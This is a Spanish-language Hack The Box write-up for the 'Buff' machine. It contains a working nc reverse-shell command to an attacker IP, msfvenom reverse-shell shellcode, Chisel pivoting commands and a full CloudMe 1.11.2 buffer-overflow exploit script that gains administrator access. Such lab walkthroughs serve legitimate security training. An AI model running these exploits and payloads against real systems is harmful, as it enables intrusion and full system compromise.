---
layout: post
title: HTB Buffer
date: '2024-01-07 22:29:43 -0500'
categories: [HTB, Easy]
tags: [Web, Enumeration ,CVE, Windows, RCE, BOF, MSFvenom, PortForwarding , Pivoting ] 
image:
  path: /buff/preview.png
  alt: Buff
---


## Resumen
![logo](/buff/logo.png){: .right w="200" h="200" }
**Buff** es una máquina intrigante, ideal para practicar la enumeración tanto en la intrusión como en la escalada de privilegios. En primer lugar, se accede a una página web que, al ser revisada, revela la tecnología que está utilizando. Al realizar una búsqueda, se identifica un exploit que permite aprovechar una vulnerabilidad de ejecución remota de código (**RCE**), lo que posibilita obtener una shell reversa en el equipo.

Posteriormente, se lleva a cabo una enumeración de las carpetas de uno de los usuarios, donde se identifica un binario de **Cloudme**. Tras una investigación en internet, se descubre que este binario es vulnerable a un desbordamiento de búfer (**buffer overflow**).

A continuación, se realiza una enumeración utilizando **Winpeas** para obtener información del equipo de manera más eficiente. Se observa que el mismo servicio de **Cloudme** se ejecuta localmente en el equipo. Utilizando **Chisel**, se establece un reenvío de puertos para hacerlo propio. Después de ejecutar el exploit, se logra obtener una shell reversa con privilegios máximos.


## Reconocimiento

**En primer lugar**, se realiza un `ping` a la máquina para verificar la conectividad con ella.

```bash
ping 10.10.10.198 -c 1
PING 10.10.10.198 (10.10.10.198) 56(84) bytes of data.
64 bytes from 10.10.10.198: icmp_seq=1 ttl=127 time=185 ms

--- 10.10.10.198 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 184.930/184.930/184.930/0.000 ms
```
{: .nolineno}

### Escaneo de Puertos

Ahora se puede realizar un escaneo de puertos con `nmap` para verificar qué puertos se encuentran abiertos dentro del equipo.
```bash
nmap -p- --min-rate 3000 10.10.10.198  -Pn

PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```
{: .nolineno}

Luego, se puede revisar qué servicios y versiones está corriendo cada uno exactamente con el siguiente comando:

```bash
nmap -p7680,8080 --min-rate 3000 10.10.10.198   -sVC  -Pn

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
```
{: .nolineno}

## Enumeración

La enumeración se dirigirá al sitio web que se encuentra corriendo en el puerto **8080**. Para comenzar, se hará uso de `whatweb` para ver qué **tecnologías** está utilizando la web.

```bash
whatweb http://10.10.10.198:8080/
http://10.10.10.198:8080/ [200 OK] Apache[2.4.43], Bootstrap, Cookies[sec_session_id], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], HttpOnly[sec_session_id], IP[10.10.10.198], JQuery[1.11.0,1.9.1], OpenSSL[1.1.1g], PHP[7.4.6], PasswordField[password], Script[text/JavaScript,text/javascript], Shopify, Title[mrb3n's Bro Hut], Vimeo, X-Powered-By[PHP/7.4.6], X-UA-Compatible[IE=edge]
```
{: .nolineno}

Al acceder al sitio web, se observa una página relacionada con un **gimnasio**.

![web](/buff/web.png)

Al revisar las pestañas de la web, se puede ver la versión que se está utilizando. Por lo tanto, se puede buscar algún **exploit** relacionado con la misma.

![version](/buff/version.png)


Y al buscar el nombre en internet, lo primero que aparece es uno que permite ganar **Ejecución de comandos** dentro del servidor.

![exploit](/buff/exploit.png)


## Explotación

Por lo que se descarga y se ejecuta de la siguiente manera, y de esta forma se gana un **RCE**.

```bash
python2.7 exploit.py  http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG

buff\shaun

C:\xampp\htdocs\gym\upload> 
```
{: .nolineno}

Para confirmar que se puede transferir el binario de `nc` con el fin de enviar una shell reversa estable y trabajar de forma más cómoda sobre el sistema, se puede realizar una prueba de escritura en la carpeta de destino.
```bash
C:\xampp\htdocs\gym\upload> echo hola >hola.txt
�PNG


C:\xampp\htdocs\gym\upload> dir
�PNG

 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

08/01/2024  14:34    <DIR>          .
08/01/2024  14:34    <DIR>          ..
08/01/2024  14:34                 7 hola.txt
08/01/2024  14:33                53 kamehameha.php
               2 File(s)             60 bytes
               2 Dir(s)   7,535,054,848 bytes free

C:\xampp\htdocs\gym\upload> 
```
{: .nolineno}


Por lo tanto, se monta un servidor **SMB** para transferir los archivos.


```bash
sudo impacket-smbserver smbFolder $(pwd) -smb2support
[sudo] password for kali: 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{: .nolineno}

```bash
copy \\10.10.14.14\smbFolder\nc.exe 
�PNG

        1 file(s) copied.

C:\xampp\htdocs\gym\upload> dir
�PNG

 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

08/01/2024  14:44    <DIR>          .
08/01/2024  14:44    <DIR>          ..
08/01/2024  14:34                 7 hola.txt
08/01/2024  14:33                53 kamehameha.php
20/12/2023  17:29            38,616 nc.exe
               3 File(s)         38,676 bytes
               2 Dir(s)   7,731,343,360 bytes free

```
{: .nolineno}

Se pone a la escuhca con `nc` para recibir la conexión.

```bash
rlwrap nc -lvp 1234
listening on [any] 1234 ...
```
{: .nolineno}

Y se envia la shell reversa hacia el equipo atacante el con `nc` que se transfirío anteriormente.

```bash
.\nc.exe -e cmd.exe 10.10.14.14 1234
```
{: .nolineno}

```bash
rlwrap nc -lvp 1234
listening on [any] 1234 ...
10.10.10.198: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.198] 49753
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>
```
{: .nolineno}


## Escalada de Privilegios

Al revisar los archivos en el equipo, se puede observar la presencia de un binario relacionado con algo llamado **CloudMe** en su versión 1.11.2.

```bash
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,861,764,096 bytes free
```
{: .nolineno}

>CloudMe es un servicio de almacenamiento de archivos operado por CloudMe AB que ofrece almacenamiento en la nube, sincronización de archivos y software de cliente.
{: .prompt-info}

Para obtener más información del equipo, se realiza la transferencia de **WinPEAS** con el fin de enumerar sus características.

```bash
sudo impacket-smbserver smbFolder $(pwd) -smb2support

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{: .nolineno}

```bash
copy \\10.10.14.14\smbFolder\winPEASx64.exe
        1 file(s) copied.
```
{: .nolineno}


Dentro de la información revelada, se constata que el servicio de **CloudMe** está en ejecución de forma local en el puerto **8888**.

```bash
 Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

 TCP        0.0.0.0               135           0.0.0.0               0               Listening         948             svchost
 TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
 TCP        0.0.0.0               5040          0.0.0.0               0               Listening         4700            svchost
 TCP        0.0.0.0               7680          0.0.0.0               0               Listening         6184            svchost
 TCP        0.0.0.0               8080          0.0.0.0               0               Listening         7712            C:\xampp\apache\bin\httpd.exe
 TCP        0.0.0.0               49664         0.0.0.0               0               Listening         528             wininit
 TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1044            svchost
 TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1368            svchost
 TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2248            spoolsv
 TCP        0.0.0.0               49668         0.0.0.0               0               Listening         672             services
 TCP        0.0.0.0               49669         0.0.0.0               0               Listening         680             lsass
 TCP        10.10.10.198          139           0.0.0.0               0               Listening         4               System
 TCP        10.10.10.198          8080          10.10.14.14           40262           Established       7712            C:\xampp\apache\bin\httpd.exe
 TCP        10.10.10.198          8080          10.10.14.14           47514           Close Wait        7712            C:\xampp\apache\bin\httpd.exe
 TCP        10.10.10.198          8080          10.10.14.14           57706           FIN Wait 2        7712            C:\xampp\apache\bin\httpd.exe
 TCP        10.10.10.198          49760         10.10.14.14           1234            Established       3248            C:\xampp\htdocs\gym\upload\nc.exe
 TCP        127.0.0.1             3306          0.0.0.0               0               Listening         8056            C:\xampp\mysql\bin\mysqld.exe
 TCP        127.0.0.1             8888          0.0.0.0               0               Listening         4588            CloudMe

 Enumerating IPv6 connections
```
{: .nolineno}

Al investigar sobre vulnerabilidades para este servicio, se descubre que la versión en cuestión es susceptible a un desbordamiento de búfer (**buffer overflow**). Por lo tanto, se plantea la posibilidad de intentar explotar esta vulnerabilidad con el objetivo de obtener una **shell** con privilegios elevados.


![buffer](/buffer/buffer.png)


### Pivoting

El inconveniente radica en la necesidad de contar con conectividad al puerto **8888**. Por lo tanto, se plantea la implementación de un **port forwarding** para redirigir dicho puerto hacia el equipo local. Con este propósito, se procede a transferir el binario de **Chisel** para facilitar esta tarea.


```bash
copy \\10.10.14.14\smbFolder\chiselWin.exe
```
{: .nolineno}

Se revisa la ocupación actual de puertos dentro de la máquina atacante con la asistencia de `netstat`.

```bash
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:43016           0.0.0.0:*                           -
```
{: .nolineno}

Se procede a montar el servidor de **Chisel** en la máquina atacante con el siguiente comando:

```bash
./chiselLinux server -v  --reverse -p 4444
2024/01/08 10:04:06 server: Reverse tunnelling enabled
2024/01/08 10:04:06 server: Fingerprint s7DUkRxiUyHmCrHIVP+ZVw6kp1UTBS3Ssa3/Z0GaO2o=
2024/01/08 10:04:06 server: Listening on http://0.0.0.0:1234
```
{: .nolineno}

Dentro de la máquina víctima, se utiliza el siguiente comando para transferir el puerto **8888** al servidor atacante:

```bash
.\chiselWin.exe client IPatacente:PuertoServer R:PuertoExponer:127.0.0.1:PuertoExponer
```
{: .nolineno}

```bash
.\chiselWin.exe client 10.10.14.14:4444 R:8888:127.0.0.1:8888
```
{: .nolineno}

Gracias a este procedimiento, al revisar los puertos dentro del servidor atacante, se confirma que el puerto **8888** está en uso.

```bash
netstat -tunlp

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp6       0      0 :::4444                 :::*                    LISTEN      60709/chiselLinux   
tcp6       0      0 :::8888                 :::*                    LISTEN      60709/chiselLinux   
udp        0      0 0.0.0.0:43016           0.0.0.0:*                           -                   
```
{: .nolineno}

Solo falta crear el **shellcode** con la ayuda de `msfvenom`, de manera que envíe una **shell reversa** hacia nuestro equipo.

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LPORT=5555 LHOST=10.10.14.14  -b "\x00\x0a\x0d" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xba\xfe\x80\x2f\xfa\xd9\xf6\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\xae"
buf += b"\x8e\xcd\x0f\xb2\x67\x93\xf0\x4a\x78\xf4\x79\xaf"
buf += b"\x49\x34\x1d\xa4\xfa\x84\x55\xe8\xf6\x6f\x3b\x18"
buf += b"\x8c\x02\x94\x2f\x25\xa8\xc2\x1e\xb6\x81\x37\x01"
buf += b"\x34\xd8\x6b\xe1\x05\x13\x7e\xe0\x42\x4e\x73\xb0"
buf += b"\x1b\x04\x26\x24\x2f\x50\xfb\xcf\x63\x74\x7b\x2c"
buf += b"\x33\x77\xaa\xe3\x4f\x2e\x6c\x02\x83\x5a\x25\x1c"
buf += b"\xc0\x67\xff\x97\x32\x13\xfe\x71\x0b\xdc\xad\xbc"
buf += b"\xa3\x2f\xaf\xf9\x04\xd0\xda\xf3\x76\x6d\xdd\xc0"
buf += b"\x05\xa9\x68\xd2\xae\x3a\xca\x3e\x4e\xee\x8d\xb5"
buf += b"\x5c\x5b\xd9\x91\x40\x5a\x0e\xaa\x7d\xd7\xb1\x7c"
buf += b"\xf4\xa3\x95\x58\x5c\x77\xb7\xf9\x38\xd6\xc8\x19"
buf += b"\xe3\x87\x6c\x52\x0e\xd3\x1c\x39\x47\x10\x2d\xc1"
buf += b"\x97\x3e\x26\xb2\xa5\xe1\x9c\x5c\x86\x6a\x3b\x9b"
buf += b"\xe9\x40\xfb\x33\x14\x6b\xfc\x1a\xd3\x3f\xac\x34"
buf += b"\xf2\x3f\x27\xc4\xfb\x95\xe8\x94\x53\x46\x49\x44"
buf += b"\x14\x36\x21\x8e\x9b\x69\x51\xb1\x71\x02\xf8\x48"
buf += b"\x12\x27\xf7\x5c\xec\x5f\x05\x60\xe5\x2c\x80\x86"
buf += b"\x6f\x43\xc5\x11\x18\xfa\x4c\xe9\xb9\x03\x5b\x94"
buf += b"\xfa\x88\x68\x69\xb4\x78\x04\x79\x21\x89\x53\x23"
buf += b"\xe4\x96\x49\x4b\x6a\x04\x16\x8b\xe5\x35\x81\xdc"
buf += b"\xa2\x88\xd8\x88\x5e\xb2\x72\xae\xa2\x22\xbc\x6a"
buf += b"\x79\x97\x43\x73\x0c\xa3\x67\x63\xc8\x2c\x2c\xd7"
buf += b"\x84\x7a\xfa\x81\x62\xd5\x4c\x7b\x3d\x8a\x06\xeb"
buf += b"\xb8\xe0\x98\x6d\xc5\x2c\x6f\x91\x74\x99\x36\xae"
buf += b"\xb9\x4d\xbf\xd7\xa7\xed\x40\x02\x6c\x1d\x0b\x0e"
buf += b"\xc5\xb6\xd2\xdb\x57\xdb\xe4\x36\x9b\xe2\x66\xb2"
buf += b"\x64\x11\x76\xb7\x61\x5d\x30\x24\x18\xce\xd5\x4a"
buf += b"\x8f\xef\xff"
```
{: .nolineno}


A continuación, se copia el **shellcode** generado con `msfvenom` en el siguiente script:

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-07-21
# Exploit Author: MTOTH
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x64 (build 1909 and 1809)
# This version has been forked from the original PoC: https://www.exploit-db.com/exploits/46218
#Instructions:
# Start the CloudMe service and run the script.

import socket
import sys
import struct

target = "127.0.0.1"

padding1   = b"A" * 1052
EIP        = struct.pack("<L", 0x68f7a81b) # 0x68f7a81b : jmp esp | {PAGE_EXECUTE_WRITECOPY} [Qt5Core.dll] ASLR: False, Rebase: False, SafeSEH: False
NOP = "\x90" * 20

# The payload provided in this PoC opens the Display Settings.
# msfvenom -a x86 -p windows/shell_bind_tcp LPORT=12345 --smallest -b "\x00\x0a\x0d" -f python  --> final payload size: 224 bytes 
# Generate X86 based payloads!
# Payload size: 258 bytes
# Final size of python file: 1263 bytes

buf =  b""
buf += b"\xba\xfe\x80\x2f\xfa\xd9\xf6\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\xae"
buf += b"\x8e\xcd\x0f\xb2\x67\x93\xf0\x4a\x78\xf4\x79\xaf"
buf += b"\x49\x34\x1d\xa4\xfa\x84\x55\xe8\xf6\x6f\x3b\x18"
buf += b"\x8c\x02\x94\x2f\x25\xa8\xc2\x1e\xb6\x81\x37\x01"
buf += b"\x34\xd8\x6b\xe1\x05\x13\x7e\xe0\x42\x4e\x73\xb0"
buf += b"\x1b\x04\x26\x24\x2f\x50\xfb\xcf\x63\x74\x7b\x2c"
buf += b"\x33\x77\xaa\xe3\x4f\x2e\x6c\x02\x83\x5a\x25\x1c"
buf += b"\xc0\x67\xff\x97\x32\x13\xfe\x71\x0b\xdc\xad\xbc"
buf += b"\xa3\x2f\xaf\xf9\x04\xd0\xda\xf3\x76\x6d\xdd\xc0"
buf += b"\x05\xa9\x68\xd2\xae\x3a\xca\x3e\x4e\xee\x8d\xb5"
buf += b"\x5c\x5b\xd9\x91\x40\x5a\x0e\xaa\x7d\xd7\xb1\x7c"
buf += b"\xf4\xa3\x95\x58\x5c\x77\xb7\xf9\x38\xd6\xc8\x19"
buf += b"\xe3\x87\x6c\x52\x0e\xd3\x1c\x39\x47\x10\x2d\xc1"
buf += b"\x97\x3e\x26\xb2\xa5\xe1\x9c\x5c\x86\x6a\x3b\x9b"
buf += b"\xe9\x40\xfb\x33\x14\x6b\xfc\x1a\xd3\x3f\xac\x34"
buf += b"\xf2\x3f\x27\xc4\xfb\x95\xe8\x94\x53\x46\x49\x44"
buf += b"\x14\x36\x21\x8e\x9b\x69\x51\xb1\x71\x02\xf8\x48"
buf += b"\x12\x27\xf7\x5c\xec\x5f\x05\x60\xe5\x2c\x80\x86"
buf += b"\x6f\x43\xc5\x11\x18\xfa\x4c\xe9\xb9\x03\x5b\x94"
buf += b"\xfa\x88\x68\x69\xb4\x78\x04\x79\x21\x89\x53\x23"
buf += b"\xe4\x96\x49\x4b\x6a\x04\x16\x8b\xe5\x35\x81\xdc"
buf += b"\xa2\x88\xd8\x88\x5e\xb2\x72\xae\xa2\x22\xbc\x6a"
buf += b"\x79\x97\x43\x73\x0c\xa3\x67\x63\xc8\x2c\x2c\xd7"
buf += b"\x84\x7a\xfa\x81\x62\xd5\x4c\x7b\x3d\x8a\x06\xeb"
buf += b"\xb8\xe0\x98\x6d\xc5\x2c\x6f\x91\x74\x99\x36\xae"
buf += b"\xb9\x4d\xbf\xd7\xa7\xed\x40\x02\x6c\x1d\x0b\x0e"
buf += b"\xc5\xb6\xd2\xdb\x57\xdb\xe4\x36\x9b\xe2\x66\xb2"
buf += b"\x64\x11\x76\xb7\x61\x5d\x30\x24\x18\xce\xd5\x4a"
buf += b"\x8f\xef\xff"



padding2 = b"D" * (2000 - len(padding1 + EIP + "\x90" * 20 + buf))

payload = padding1 + EIP + NOP + buf + padding2  

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(payload)
        print(" [+] Payload with {} bytes sent!".format(len(payload)))
except Exception as e:
        print("Something bad happened. The error code was: {}".format(sys.exc_value))

```
Para finalizar, solo es necesario ponerse a la escucha con `nc` en el puerto deseado y ejecutar el exploit.

```bash
nc -lvp 5555
listening on [any] 5555 ...
```
{: .nolineno}




```bash
python2.7 PoC_exploit_Win10_x64.py
 [+] Payload with 2000 bytes sent!
```
{: .nolineno}

Con este procedimiento, se logra obtener privilegios máximos dentro de la máquina víctima, comprometiendo el sistema como usuario con privilegios elevados.


```bash
nc -lvp 5555
listening on [any] 5555 ...
10.10.10.198: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.198] 49681
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>whoami
whoami
buff\administrator
```
{: .nolineno}
